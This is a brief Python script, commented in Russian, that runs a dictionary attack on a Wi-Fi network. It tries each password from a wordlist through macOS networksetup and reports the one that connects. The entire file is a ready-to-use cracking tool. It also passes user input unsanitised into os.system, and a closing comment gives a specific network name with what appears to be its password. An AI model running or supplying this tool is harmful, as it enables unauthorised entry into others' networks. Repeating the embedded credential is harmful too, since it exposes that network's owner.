from asyncio.subprocess import PIPE
import os, sys, subprocess

# Проверка аргументов
if(len(sys.argv) <= 3):
    print("Invalid arguments!")
    exit(1)

if(len(sys.argv) > 4):
    print("Invalid arguments!")
    exit(1)

# Парсинг аргументов 
iface = sys.argv[1]
bssid = sys.argv[2]
filename = sys.argv[3]

# Включение wifi 
if(os.system("ifconfig " + iface + " up")):
    exit(1)

try:
    with open(filename, "r") as file:

        # Перебор словаря
        for password in file.readlines():
            password = password.rstrip("\n")

            # Собираем команду 
            cmd = ["networksetup", "-setairportnetwork", "en0", bssid, password]
            print("try: ", bssid, password)

            # Запуск процесса подключения к wifi
            proc = subprocess.Popen(cmd, stdout=PIPE)
            proc.wait()

            # Получаем вывод и проверяем 
            res = proc.communicate()  # получить tuple('stdout', 'stderr')

            # Если bssid неверный - ошибка
            if(res[0].decode().find("Could not find network ") == 0):
                print("Invalid BSSID !")
                break

            # Если ошибки нет - пароль найден
            if(res[0] == b''):
                print("\n\n\tPASSWORD FOUND:", password, "\n\n")
                break

except FileNotFoundError:
    print("Invalid filename!")

# networksetup -setairportnetwork en0 RT-5GPON-0963 Yn3VfuhD
